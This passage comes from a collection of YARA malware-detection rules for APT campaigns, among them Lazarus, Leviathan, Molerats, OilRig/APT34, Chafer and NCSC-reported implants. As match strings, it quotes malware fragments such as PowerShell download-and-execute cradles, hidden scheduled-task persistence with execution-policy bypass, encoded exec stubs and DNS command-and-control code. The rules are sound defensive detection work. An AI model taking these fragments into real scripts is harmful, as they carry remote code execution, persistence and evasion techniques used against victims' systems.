      description = "Detects Lazarus malware from incident in Dec 2017ithumb.js"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20"
      hash1 = "8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3"
      hash2 = "7975c09dd436fededd38acee9769ad367bfe07c769770bd152f33a10ed36529e"
   strings:
      $s1 = "var _0xf5ed=[\"\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\\x68\\x65\\x6C\\x6C\"," ascii
   condition:
      filesize < 9KB and 1 of them
}

rule Lazarus_Dec_17_5 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20"
      hash1 = "db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471"
   strings:
      $x1 = "$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList" fullword ascii
      $x2 = "$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;" fullword ascii
      $x3 = "[String]$PS_PATH = \"C:\\\\Users\\\\Public\\\\Documents\\\\ProxyAutoUpdate.ps1\";" fullword ascii
      $x4 = "$cmdSchedule = 'schtasks /create /tn \"ProxyServerUpdater\"" ascii
      $x5 = "/tr \"powershell.exe -ep bypass -windowstyle hidden -file " ascii
      $x6 = "C:\\\\Users\\\\Public\\\\Documents\\\\tmp' + -join " ascii
      $x7 = "$cmdResult = cmd.exe /c $cmdInst | Out-String;" fullword ascii
      $x8 = "whoami /groups | findstr /c:\"S-1-5-32-544\"" fullword ascii
   condition:
      filesize < 500KB and 1 of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-10-18
   Identifier: Leviathan Phishing Attacks
   Reference: https://goo.gl/MZ7dRg
*/

/* Rule Set ----------------------------------------------------------------- */

rule SeDLL_Javascript_Decryptor {
   meta:
      description = "Detects SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18"
      hash1 = "146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4"
   strings:
      $x1 = "SEDll_Win32.dll" fullword ascii
      $x2 = "regsvr32 /s \"%s\" DR __CIM__" fullword wide

      $s1 = "WScriptW" fullword ascii
      $s2 = "IWScript" fullword ascii
      $s3 = "%s\\%s~%d" fullword wide
      $s4 = "PutBlockToFileWW" fullword ascii
      $s5 = "CheckUpAndDownWW" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and ( 1 of ($x*) or 4 of them )
}

rule Leviathan_CobaltStrike_Sample_1 {
   meta:
      description = "Detects Cobalt Strike sample from Leviathan report"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18"
      hash1 = "5860ddc428ffa900258207e9c385f843a3472f2fbf252d2f6357d458646cf362"
   strings:
      $x1 = "a54c81.dll" fullword ascii
      $x2 = "%d is an x64 process (can't inject x86 content)" fullword ascii
      $x3 = "Failed to impersonate logged on user %d (%u)" fullword ascii

      $s1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $s2 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $s3 = "could not run command (w/ token) because of its length of %d bytes!" fullword ascii
      $s4 = "could not write to process memory: %d" fullword ascii
      $s5 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
      $s6 = "Could not connect to pipe (%s): %d" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and ( 1 of ($x*) or 3 of them )
}

rule MockDll_Gen {
   meta:
      description = "Detects MockDll - regsvr DLL loader"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18"
      hash1 = "bfc5c6817ff2cc4f3cd40f649e10cc9ae1e52139f35fdddbd32cb4d221368922"
      hash2 = "80b931ab1798d7d8a8d63411861cee07e31bb9a68f595f579e11d3817cfc4aca"
   strings:
      $x1 = "mock_run_ini_Win32.dll" fullword ascii
      $x2 = "mock_run_ini_x64.dll" fullword ascii

      $s1 = "RealCmd=%s %s" fullword ascii
      $s2 = "MockModule=%s" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and ( 1 of ($x*) or 2 of them )
}

rule VBScript_Favicon_File {
   meta:
      description = "VBScript cloaked as Favicon file used in Leviathan incident"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18"
      hash1 = "39c952c7e14b6be5a9cb1be3f05eafa22e1115806e927f4e2dc85d609bc0eb36"
   strings:
      $x1 = "myxml = '<?xml version=\"\"1.0\"\" encoding=\"\"UTF-8\"\"?>';myxml = myxml +'<root>" ascii
      $x2 = ".Run \"taskkill /im mshta.exe" ascii
      $x3 = "<script language=\"VBScript\">Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 :" ascii

      $s1 = ".ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") &" fullword ascii
      $s2 = ".ExpandEnvironmentStrings(\"%temp%\") & " ascii
   condition:
      filesize < 100KB and ( uint16(0) == 0x733c and 1 of ($x*) )
      or ( 3 of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-17
   Identifier: Magic Hound
*/

/* Rule Set ----------------------------------------------------------------- */

rule APT_PupyRAT_PY {
   meta:
      description = "Detects Pupy RAT"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations"
      date = "2017-02-17"
      hash1 = "8d89f53b0a6558d6bb9cdbc9f218ef699f3c87dd06bc03dd042290dedc18cb71"
   strings:
      $x1 = "reflective_inject_dll" fullword ascii
      $x2 = "ImportError: pupy builtin module not found !" fullword ascii
      $x3 = "please start pupy from either it's exe stub or it's reflective DLLR;" fullword ascii
      $x4 = "[INJECT] inject_dll." fullword ascii
      $x5 = "import base64,zlib;exec zlib.decompress(base64.b64decode('eJzzcQz1c/ZwDbJVT87Py0tNLlHnAgA56wXS'))" fullword ascii

      $op1 = { 8b 42 0c 8b 78 14 89 5c 24 18 89 7c 24 14 3b fd } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and 1 of them ) or ( 2 of them )
}

/* Super Rules ------------------------------------------------------------- */

rule APT_MagicHound_MalMacro {
   meta:
      description = "Detects malicious macro / powershell in Office document"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations"
      date = "2017-02-17"
      super_rule = 1
      hash1 = "66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b"
      hash2 = "e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6"
   strings:
      $s1 = "powershell.exe " fullword ascii
      $s2 = "CommandButton1_Click" fullword ascii
      $s3 = "URLDownloadToFile" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 8000KB and all of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2018-02-07
   Identifier: ME Campaign Talos Report
   Reference: http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html
*/

import "pe"

/* Rule Set ----------------------------------------------------------------- */
  

rule ME_Campaign_Malware_3 {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07"
      hash1 = "15f5aaa71bfa3d62fd558a3e88dd5ba26f7638bf2ac653b8d6b8d54dc7e5926b"
   strings:
      $x1 = "objWShell.Run \"powershell.exe -ExecutionPolicy Bypass -File \"\"%appdata%\"\"\\sys.ps1\", 0 " fullword ascii
      $x2 = "objFile.WriteLine \"New-Item -Path \"\"$ENV:APPDATA\\Microsoft\\Templates\"\" -ItemType Directory -Force }\" " fullword ascii
      $x3 = "objFile.WriteLine \"$path = \"\"$ENV:APPDATA\\Microsoft\\Templates\\Report.doc\"\"\" " fullword ascii
      $s4 = "File=appData & \"\\sys.ps1\"" fullword ascii
   condition:
      uint16(0) == 0x6553 and filesize < 400KB and 1 of them
}
 
 
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-07
   Identifier: Molerats Jul17
   Reference: https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule Molerats_Jul17_Sample_1 {
   meta:
      description = "Detects Molerats sample - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "ebf2423b9de131eab1c61ac395cbcfc2ac3b15bd9c83b96ae0a48619a4a38d0a"
   strings:
      /* {11804ce4-930a-4b09-bf70-9f1a95d0d70d}, Culture=neutral, PublicKeyToken=3e56350693f7355e */
      $s1 = "ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00" wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Molerats_Jul17_Sample_2 {
   meta:
      description = "Detects Molerats sample - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "7e122a882d625f4ccac019efb7bf1b1024b9e0919d205105e7e299fb1a20a326"
   strings:
      $s1 = "Folder.exe" fullword ascii
      $s2 = "Notepad++.exe" fullword wide
      $s3 = "RSJLRSJOMSJ" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )
}

rule Molerats_Jul17_Sample_3 {
   meta:
      description = "Detects Molerats sample - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "995eee4122802c2dc83bb619f8c53173a5a9c656ad8f43178223d78802445131"
      hash2 = "fec657a19356753008b0f477083993aa5c36ebaf7276742cf84bfe614678746b"
   strings:
      $s1 = "ccleaner.exe" fullword wide
      $s2 = "Folder.exe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and all of them )
}

rule Molerats_Jul17_Sample_4 {
   meta:
      description = "Detects Molerats sample - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "512a14130a7a8b5c2548aa488055051ab7e725106ddf2c705f6eb4cfa5dc795c"
   strings:
      $x1 = "get-itemproperty -path 'HKCU:\\SOFTWARE\\Microsoft\\' -name 'KeyName')" wide
      $x2 = "O.Run C & chrw(34) & \"[System.IO.File]::" wide
      $x3 = "HKCU\\SOFTWARE\\Microsoft\\\\KeyName\"" fullword wide
   condition:
      ( filesize < 700KB and 1 of them )
}

rule Molerats_Jul17_Sample_5 {
   meta:
      description = "Detects Molerats sample - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "ebf2423b9de131eab1c61ac395cbcfc2ac3b15bd9c83b96ae0a48619a4a38d0a"
   strings:
      $x1 = "powershell.exe -nop -c \"iex" nocase ascii
      $x2 = ".run('%windir%\\\\SysWOW64\\\\WindowsPowerShell\\\\" ascii

      $a1 = "Net.WebClient).DownloadString" nocase ascii
      $a2 = "gist.githubusercontent.com" nocase ascii
   condition:
      filesize < 200KB and ( 1 of ($x*) or 2 of them )
}

rule Molerats_Jul17_Sample_Dropper {
   meta:
      description = "Detects Molerats sample dropper SFX - July 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07"
      hash1 = "ad0b3ac8c573d84c0862bf1c912dba951ec280d31fe5b84745ccd12164b0bcdb"
   strings:
      $s1 = "Please remove %s from %s folder. It is unsecure to run %s until it is done." fullword wide
      $s2 = "sfxrar.exe" fullword ascii
      $s3 = "attachment.hta" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )
}
/*
   Yara Rule Set
   Author: NCSC (modified for performance reasons by Florian Roth)
   Date: 2018-04-06
   Identifier: Hostile state actors compromising UK organisations
   Reference: https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control
*/

rule Bytes_used_in_AES_key_generation {
   meta:
      author = "NCSC"
      description = "Detects Backdoor.goodor"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "b5278301da06450fe4442a25dda2d83d21485be63598642573f59c59e980ad46"
   strings:
      $a1 = {35 34 36 35 4B 4A 55 54 5E 49 55 5F 29 7B 68 36 35 67 34 36 64 66 35 68}
      /* $a2 = {fb ff ff ff 00 00}  disabled due to performance issues */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and all of ($a*)
}

rule Partial_Implant_ID {
   meta:
      author = "NCSC"
      description = "Detects implant from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "b5278301da06450fe4442a25dda2d83d21485be63598642573f59c59e980ad46"
   strings:
      $a1 = {38 38 31 34 35 36 46 43}
      /* $a2 = {fb ff ff ff 00 00} disabled due to performance issues */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and all of ($a*)
}

rule Sleep_Timer_Choice {
   meta:
      author = "NCSC"
      description = "Detects malware from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "b5278301da06450fe4442a25dda2d83d21485be63598642573f59c59e980ad46"
   strings:
      $a1 = {8b0424b90f00000083f9ff743499f7f98d420f}
      /* $a2 = {fb ff ff ff 00 00} disabled due to performance issues */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and all of ($a*)
}

rule User_Function_String {
   meta:
      author = "NCSC"
      description = "Detects user function string from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "b5278301da06450fe4442a25dda2d83d21485be63598642573f59c59e980ad46"
   strings:
      /* $b1 = {fb ff ff ff 00 00} disabled due to performance issues */
      $a2 = "e.RandomHashString"
      $a3 = "e.Decode"
      $a4 = "e.Decrypt"
      $a5 = "e.HashStr"
      $a6 = "e.FromB64"
   condition:
      /* $b1 and */ 4 of ($a*)
}

rule generic_shellcode_downloader_specific {
  meta:
    author = "NCSC"
    description = "Detects Doorshell from NCSC report"
    reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
    date = "2018/04/06"
    hash = "b8bc0611a7fd321d2483a0a9a505251e15c22402e0cfdc62c0258af53ed3658a"
  strings:
    $push1 = {68 6C 6C 6F 63}
    $push2 = {68 75 61 6C 41}
    $push3 = {68 56 69 72 74}
    $a = {BA 90 02 00 00 46 C1 C6 19 03 DD 2B F4 33 DE}
    $b = {87 C0 81 F2 D1 19 89 14 C1 C8 1F FF E0}
  condition:
    (uint16(0) == 0x5A4D and uint16(uint32(0x3C)) == 0x4550) and ($a or $b) and @push1 < @push2 and @push2 < @push3
}

rule Batch_Script_To_Run_PsExec {
   meta:
      author = "NCSC"
      description = "Detects malicious batch file from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "b7d7c4bc8f9fd0e461425747122a431f93062358ed36ce281147998575ee1a18"
   strings:
      $ = "Tokens=1 delims=" ascii
      $ = "SET ws=%1" ascii
      $ = "Checking %ws%" ascii
      $ = "%TEMP%\\%ws%ns.txt" ascii
      $ = "ps.exe -accepteula" ascii
   condition:
      3 of them
}

rule Batch_Powershell_Invoke_Inveigh {
   meta:
      author = "NCSC"
      description = "Detects malicious batch file from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "0a6b1b29496d4514f6485e78680ec4cd0296ef4d21862d8bf363900a4f8e3fd2"
   strings:
      $ = "Inveigh.ps1" ascii
      $ = "Invoke-Inveigh" ascii
      $ = "-LLMNR N -HTTP N -FileOutput Y" ascii
      $ = "powershell.exe" ascii
   condition:
      all of them
}

rule lnk_detect {
   meta:
      author = "NCSC"
      description = "Detects malicious LNK file from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
   strings:
      $lnk_magic = {4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46}
      $lnk_target = {41 00 55 00 54 00 4F 00 45 00 58 00 45 00 43 00 2E 00 42 00 41 00 54}
      $s1 = {5C 00 5C 00 31 00}
      $s2 = {5C 00 5C 00 32 00}
      $s3 = {5C 00 5C 00 33 00}
      $s4 = {5C 00 5C 00 34 00}
      $s5 = {5C 00 5C 00 35 00}
      $s6 = {5C 00 5C 00 36 00}
      $s7 = {5C 00 5C 00 37 00}
      $s8 = {5C 00 5C 00 38 00}
      $s9 = {5C 00 5C 00 39 00}
   condition:
      uint32be(0) == 0x4c000000 and
      uint32be(4) == 0x01140200 and
      (($lnk_magic at 0) and $lnk_target) and 1 of ($s*)
}

rule RDP_Brute_Strings {
   meta:
      author = "NCSC"
      description = "Detects RDP brute forcer from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "8234bf8a1b53efd2a452780a69666d1aedcec9eb1bb714769283ccc2c2bdcc65"
   strings:
      $ = "RDP Brute" ascii wide
      $ = "RdpChecker" ascii
      $ = "RdpBrute" ascii
      $ = "Brute_Count_Password" ascii
      $ = "BruteIPList" ascii
      $ = "Chilkat_Socket_Key" ascii
      $ = "Brute_Sync_Stat" ascii
      $ = "(Error! Hyperlink reference not valid.)" wide
      $ = "BadRDP" wide
      $ = "GoodRDP" wide
      $ = "@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}{0}del \"{2}\"" wide
      $ = "Coded by z668" wide
   condition:
      4 of them
}

rule Z_WebShell {
   meta:
      author = "NCSC"
      description = "Detects Z Webshell from NCSC report"
      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
      date = "2018/04/06"
      hash = "ace12552f3a980f1eed4cadb02afe1bfb851cafc8e58fb130e1329719a07dbf0"
   strings:
      $ = "Z_PostBackJS" ascii wide
      $ = "z_file_download" ascii wide
      $ = "z_WebShell" ascii wide
      $ = "1367948c7859d6533226042549228228" ascii wide
   condition:
      3 of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-10-12
   Identifier: OilRig Malware Campaign
*/

import "pe"

/* Rule Set ----------------------------------------------------------------- */

rule Oilrig_IntelSecurityManager_macro {
   meta:
      description = "Detects OilRig malware"
      author = "Eyal Sela (slightly modified by Florian Roth)"
      reference = "Internal Research"
      date = "2018-01-19"
   strings:
      $one1 = "$c$m$$d$.$$" ascii wide
      $one2 = "$C$$e$r$$t$u$$t$i$$l$" ascii wide
      $one3 = "$$%$a$$p$p$$d$a$" ascii wide
      $one4 = ".$t$$x$t$$" ascii wide
      $one5 = "cu = Replace(cu, \"$\", \"\")" ascii wide
      $one6 = "Shell Environ$(\"COMSPEC\") & \" /c"
      $one7 = "echo \" & Chr(32) & cmd & Chr(32) & \" > \" & Chr(34)" ascii wide

      $two1 = "& SchTasks /Delete /F /TN " ascii wide
      $two2 = "SecurityAssist" ascii wide
      $two3 = "vbs = \"cmd.exe /c SchTasks" ascii wide
      $two4 = "/Delete /F /TN Conhost & del" ascii wide
      $two5 = "NullRefrencedException" ascii wide
      $two6 = "error has occurred in user32.dll by" ascii wide
      $two7 = "NullRefrencedException" ascii wide
   condition:
      filesize < 300KB and 1 of ($one*) or 2 of ($two*)
}

rule Oilrig_IntelSecurityManager {
   meta:
      description = "Detects OilRig malware"
      author = "Eyal Sela"
      reference = "Internal Research"
      date = "2018-01-19"
   strings:
      $one1 = "srvResesponded" ascii wide fullword
      $one2 = "InetlSecurityAssistManager" ascii wide fullword
      $one3 = "srvCheckresponded" ascii wide fullword
      $one4 = "IntelSecurityManager" ascii wide
      $one5 = "msoffice365cdn.com" ascii wide
      $one6 = "\\tmpCa.vbs" ascii wide
      $one7 = "AAZFinish" ascii wide fullword
      $one8 = "AAZUploaded" ascii wide fullword
      $one9 = "ABZFinish" ascii wide fullword
      $one10 = "\\tmpCa.vbs" ascii wide
   condition:
      filesize < 300KB and any of them
}

/*
   YARA Rule Set
   Author: Florian Roth
   Date: 2019-04-17
   Identifier: Leaked APT34 / OilRig tools
   Reference: https://twitter.com/0xffff0800/status/1118406371165126656
*/

/* Rule Set ----------------------------------------------------------------- */

rule APT_APT34_PS_Malware_Apr19_1 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17"
      hash1 = "b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768"
   strings:
      $x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
      $x2 = "Write-Host \"excepton occured!\"" ascii /* :) */

      $s1 = "Start-Sleep -s 1;" fullword ascii
      $s2 = "Start-Sleep -m 100;" fullword ascii
   condition:
      1 of ($x*) or 2 of them
}

rule APT_APT34_PS_Malware_Apr19_2 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17"
      hash1 = "2943e69e6c34232dee3236ced38d41d378784a317eeaf6b90482014210fcd459"
   strings:
      $x1 = "= \"http://\" + [System.Net.Dns]::GetHostAddresses(\"" ascii
      $x2 = "$t = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" fullword ascii
      $x3 = "| Where { $_ -notmatch '^\\s+$' }" ascii

      $s1 = "= new-object System.Net.WebProxy($u, $true);" fullword ascii
      $s2 = " -eq \"dom\"){$" ascii
      $s3 = " -eq \"srv\"){$" ascii
      $s4 = "+\"<>\" | Set-Content" ascii
   condition:
      1 of ($x*) and 3 of them
}

rule APT_APT34_PS_Malware_Apr19_3 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17"
      hash1 = "27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed"
   strings:
      $x1 = "Powershell.exe -exec bypass -file ${global:$address1}"
      $x2 = "schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn"
      $x3 = "\"\\UpdateTasks\\UpdateTaskHosts\""
      $x4 = "wscript /b \\`\"${global:$address1" ascii
      $x5 = "::FromBase64String([string]${global:$http_ag}))" ascii
      $x6 = ".run command1, 0, false\" | Out-File " fullword ascii
      $x7 = "\\UpdateTask.vbs" fullword ascii
      $x8 = "hUpdater.ps1" fullword ascii
   condition:
      1 of them
}
/*
   Yara Rule Set
   Author: Markus Neis, Florian Roth
   Date: 2018-03-21
   Identifier: OilRig / Chafer activity
   Reference: https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/
*/

/* Rule Set ----------------------------------------------------------------- */

rule Chafer_Mimikatz_Custom  {
   meta:
      description = "Detects Custom Mimikatz Version"
      author = "Florian Roth / Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "9709afeb76532566ee3029ecffc76df970a60813bcac863080cc952ad512b023"
   strings:
      $x1 = "C:\\Users\\win7p\\Documents\\mi-back\\" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Chafer_Exploit_Copyright_2017 {
   meta:
      description = "Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "cdac69caad8891c5e1b8eabe598c869674dee30af448ce4e801a90eb79973c66"
   strings:
      $x1 = "test3 Internet Server Extension" fullword wide
      $x2 = "Copyright (C) 2017 Exploit" fullword wide

      $a1 = "popen() failed!" fullword ascii
      $a2 = "cmd2cmd=" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and (
         1 of ($x*) or all of ($a*)
      )
}

rule Chafer_Portscanner {
   meta:
      description = "Detects Custom Portscanner used by Oilrig"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "88274a68a6e07bdc53171641e7349d6d0c71670bd347f11dcc83306fe06656e9"
   strings:
      $x1 = "C:\\Users\\RS01204N\\Documents\\" ascii
      $x2 = "PortScanner /ip:google.com  /port:80 /t:500 /tout:2" fullword ascii
      $x3 = "open ports of host/hosts" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them
}

rule Oilrig_Myrtille {
   meta:
      description = "Detects Oilrig Myrtille RDP Browser"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "67945f2e65a4a53e2339bd361652c6663fe25060888f18e681418e313d1292ca"
   strings:
      $x1 = "\\obj\\Release\\Myrtille.Services.pdb" fullword ascii
      $x2 = "Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})" fullword wide
      $x3 = "Started rdp client process, remote session {0}" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and 1 of them
}

rule Chafer_Packed_Mimikatz {
   meta:
      description = "Detects Oilrig Packed Mimikatz also detected as Chafer_WSC_x64 by FR"
      author = "Florian Roth / Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "5f2c3b5a08bda50cca6385ba7d84875973843885efebaff6a482a38b3cb23a7c"
   strings:
      $s1 = "Windows Security Credentials" fullword wide
      $s2 = "Minisoft" fullword wide
      $x1 = "Copyright (c) 2014 - 2015 Minisoft" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and ( all of ($s*) or $x1 )
}

rule Oilrig_PS_CnC {
   meta:
      description = "Powershell CnC using DNS queries"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22"
      hash1 = "9198c29a26f9c55317b4a7a722bf084036e93a41ba4466cbb61ea23d21289cfa"
   strings:
      $x1 = "(-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize" fullword ascii
      $s2 = "$hostname = \"D\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|" ascii
   condition:
      filesize < 40KB and 1 of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-10-18
   Identifier: OilRig
   Reference: https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/
*/

/* Rule Set ----------------------------------------------------------------- */

rule OilRig_Strings_Oct17 {
   meta:
      description = "Detects strings from OilRig malware and malicious scripts"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
      date = "2017-10-18"
   strings:
      $x1 = "%localappdata%\\srvHealth.exe" fullword wide ascii
      $x2 = "%localappdata%\\srvBS.txt" fullword wide ascii
      $x3 = "Agent Injector\\PolicyConverter\\Inner\\obj\\Release\\Inner.pdb" fullword ascii
      $x4 = "Agent Injector\\PolicyConverter\\Joiner\\obj\\Release\\Joiner.pdb" fullword ascii
      $s3 = ".LoadDll(\"Run\", arg, \"C:\\\\Windows\\\\" ascii
   condition:
